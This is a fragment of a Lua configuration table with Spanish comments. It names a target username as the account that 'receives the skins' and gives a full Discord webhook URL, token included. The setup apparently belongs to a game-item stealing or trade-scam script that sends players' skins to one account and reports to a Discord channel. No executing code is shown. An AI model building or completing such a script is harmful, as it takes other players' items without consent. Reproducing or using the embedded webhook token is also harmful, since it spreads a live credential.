local CONFIG = {
    ...
    TARGET_NAME   = "5636421", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1548987490273333250/RovF3tRZz029uTjPOoRjloTOoXPRbzQvctsB8WIVQimZI65FAp8RF3WxDzslJq0xzTIN", -- "https://discord.com/api/webhooks/" webhook de Discord
